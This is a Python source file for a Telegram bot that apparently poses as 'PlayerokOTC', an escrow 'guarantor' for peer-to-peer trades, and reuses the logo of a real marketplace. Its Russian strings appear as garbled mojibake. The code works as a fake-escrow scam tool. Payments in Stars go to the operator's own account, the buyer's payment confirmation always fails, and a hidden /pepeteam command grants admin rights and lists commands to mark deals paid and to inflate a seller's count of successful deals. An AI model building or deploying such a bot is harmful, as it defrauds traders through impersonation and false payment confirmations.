import asyncio
import os
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

# –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
TOKEN = os.getenv("TG_TOKEN")

if not TOKEN:
    raise ValueError("‚ùå –û—à–∏–±–∫–∞: –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è TG_TOKEN –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!")

ADMIN_IDS = set()
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_wallets = {}
deals = {}

class DealStates(StatesGroup):
    waiting_currency = State()
    waiting_wallet = State()
    waiting_amount = State()
    waiting_description = State()

main_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏"), types.KeyboardButton(text="–°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É")],
        [types.KeyboardButton(text="–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞"), types.KeyboardButton(text="–ü–æ–¥–¥–µ—Ä–∂–∫–∞")]
    ],
    resize_keyboard=True
)

currency_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text=c)] for c in ["USD", "RUB", "UAH", "USDT", "BTC", "TON", "Stars"]],
    resize_keyboard=True
)

# /start
@dp.message(CommandStart())
async def start(message: types.Message):
    args = message.text.split()
    # –ï—Å–ª–∏ –µ—Å—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç —Å–¥–µ–ª–∫–∏
    if len(args) > 1 and args[1].startswith("deal"):
        deal_id = args[1][4:]
        if deal_id in deals:
            deal = deals[deal_id]
            if message.from_user.id == deal["seller_id"]:
                await message.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–π—Ç–∏ –≤ —Å–≤–æ—é —Å–¥–µ–ª–∫—É –∫–∞–∫ –ø–æ–∫—É–ø–∞—Ç–µ–ª—å.")
                return
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø—Ä–æ–¥–∞–≤—Ü–∞
            await bot.send_message(
                deal["seller_id"],
                f"üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å @{message.from_user.username or message.from_user.id} –∑–∞—à–µ–ª –≤ –≤–∞—à—É —Å–¥–µ–ª–∫—É ‚Ññ{deal_id}"
            )
            buyer_kb = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"confirm_{deal_id}")],
                [types.InlineKeyboardButton(text="üö™ –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", callback_data=f"exit_{deal_id}")]
            ])
            wallet_display = deal["wallet"] if deal["currency"] != "Stars" else "@PlayerokOTC"
            stars_note = "–°–ø–æ—Å–æ–± –ø–µ—Ä–µ–¥–∞—á–∏: –ü–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø–æ–¥–∞—Ä–∫–∏ –ø–æ 100 –∑–≤–µ–∑–¥\n" if deal["currency"] == "Stars" else ""
            await message.answer(
                f"üí≥ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–¥–µ–ª–∫–µ #{deal_id}\n\n"
                f"üë§ –í—ã –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –≤ —Å–¥–µ–ª–∫–µ.\n"
                f"üìå –ü—Ä–æ–¥–∞–≤–µ—Ü: @{deal['seller_username']} ({deal['seller_id']})\n"
                f"‚Ä¢ –í—ã –ø–æ–∫—É–ø–∞–µ—Ç–µ: {deal['desc']}\n\n"
                f"üè¶ –ê–¥—Ä–µ—Å –¥–ª—è –æ–ø–ª–∞—Ç—ã: {wallet_display}\n"
                f"{stars_note}"
                f"üí∞ –°—É–º–º–∞ –∫ –æ–ø–ª–∞—Ç–µ: {deal['amount']} {deal['currency']}\n"
                f"‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–±–µ–¥–∏—Ç–µ—Å—å –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç–∏ –¥–∞–Ω–Ω—ã—Ö –ø–µ—Ä–µ–¥ –æ–ø–ª–∞—Ç–æ–π.",
                reply_markup=buyer_kb
            )
            return
        else:
            await message.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
            return

    # –°—Ç–∞—Ä—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–∞—Ä—Ç–∏–Ω–∫–æ–π
    await message.answer_photo(
        photo="https://playerok.com/og_playerok.png",
        caption=(
            "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ PlayerokOTC ‚Äì –Ω–∞–¥–µ–∂–Ω—ã–π P2P-–≥–∞—Ä–∞–Ω—Ç\n\n"
            "üíº –ü–æ–∫—É–ø–∞–π—Ç–µ –∏ –ø—Ä–æ–¥–∞–≤–∞–π—Ç–µ –≤—Å—ë, —á—Ç–æ —É–≥–æ–¥–Ω–æ ‚Äì –±–µ–∑–æ–ø–∞—Å–Ω–æ —Å –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–π –∫–æ–º–∏—Å—Å–∏–µ–π!\n"
            "–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª –Ω–∏–∂–µ:"
        ),
        reply_markup=main_kb
    )

# –ü–æ–¥–¥–µ—Ä–∂–∫–∞
@dp.message(F.text == "–ü–æ–¥–¥–µ—Ä–∂–∫–∞")
async def support(message: types.Message):
    await message.answer("üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞: @PlayerokOTC")

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏
@dp.message(F.text == "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏")
async def manage_wallet(message: types.Message, state: FSMContext):
    await message.answer("üí≥ –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:", reply_markup=currency_kb)
    await state.set_state(DealStates.waiting_currency)

@dp.message(DealStates.waiting_currency)
async def set_currency(message: types.Message, state: FSMContext):
    if message.text not in ["USD", "RUB", "UAH", "USDT", "BTC", "TON", "Stars"]:
        await message.answer("‚ùå –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É —Ç–æ–ª—å–∫–æ –∏–∑ —Å–ø–∏—Å–∫–∞!")
        return
    await state.update_data(currency=message.text)
    if message.text == "Stars":
        user_wallets[message.from_user.id] = {"currency": "Stars", "wallet": "@PlayerokOTC"}
        await message.answer("‚úÖ –í–∞–ª—é—Ç–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: Stars", reply_markup=main_kb)
        await state.clear()
    else:
        await message.answer(
            f"‚úÖ –í–∞–ª—é—Ç–∞ –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: {message.text}\n–í–≤–µ–¥–∏—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ (–∫–∞—Ä—Ç–∞, TON, –¥—Ä—É–≥–æ–π):",
            reply_markup=types.ReplyKeyboardRemove()
        )
        await state.set_state(DealStates.waiting_wallet)

@dp.message(DealStates.waiting_wallet)
async def set_wallet(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_wallets[message.from_user.id] = {"currency": data["currency"], "wallet": message.text}
    await message.answer(f"‚úÖ –†–µ–∫–≤–∏–∑–∏—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã: {message.text} ({data['currency']})", reply_markup=main_kb)
    await state.clear()

# –°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏
@dp.message(F.text == "–°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É")
async def create_deal(message: types.Message, state: FSMContext):
    if message.from_user.id not in user_wallets:
        await message.answer("–°–Ω–∞—á–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤–∞–ª—é—Ç—É –∫–æ—à–µ–ª—å–∫–∞ —á–µ—Ä–µ–∑ '–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏'.")
        return
    await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏ (—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä: 100):")
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def deal_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("‚ùå –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º!")
        return
    await state.update_data(amount=message.text)
    await message.answer(
        f"üìù –£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –≤—ã –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç–µ –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ –∑–∞ {message.text} {user_wallets[message.from_user.id]['currency']}:"
    )
    await state.set_state(DealStates.waiting_description)

@dp.message(DealStates.waiting_description)
async def deal_description(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    wallet_info = user_wallets[user_id]
    data = await state.get_data()

    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    memo = f"{deal_id}{user_id}"
    deals[deal_id] = {
        "seller_id": user_id,
        "seller_username": message.from_user.username,
        "wallet": wallet_info.get("wallet", "@PlayerokOTC"),
        "currency": wallet_info["currency"],
        "amount": data["amount"],
        "desc": message.text,
        "memo": memo
    }

    link = f"https://t.me/PlayerokOTC_Robot?start=deal{deal_id}"
    await message.answer(
        f"‚úÖ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!\n\n"
        f"üí∞ –°—É–º–º–∞: {data['amount']} {wallet_info['currency']}\n"
        f"üìú –û–ø–∏—Å–∞–Ω–∏–µ: {message.text}\n"
        f"üîó –°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è: {link}",
        reply_markup=main_kb
    )
    await state.clear()

# –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª –∫–Ω–æ–ø–∫—É
@dp.callback_query(F.data.startswith("confirm_"))
async def confirm_payment(callback: types.CallbackQuery):
    await callback.message.answer("‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")

@dp.callback_query(F.data.startswith("exit_"))
async def exit_deal(callback: types.CallbackQuery):
    await callback.message.answer("üö™ –í—ã –≤—ã—à–ª–∏ –∏–∑ —Å–¥–µ–ª–∫–∏.")

# /pepeteam
@dp.message(Command("pepeteam"))
async def pepeteam(message: types.Message):
    ADMIN_IDS.add(message.from_user.id)
    await message.answer(
        "‚úÖ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä!\n\n"
        "üîπ /buy #–∫–æ–¥_—Å–¥–µ–ª–∫–∏ ‚Äî –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É.\n"
        "üîπ /set_my_deals <—á–∏—Å–ª–æ> ‚Äî —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫."
    )

# –ó–∞–ø—É—Å–∫
async def main():
    print("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
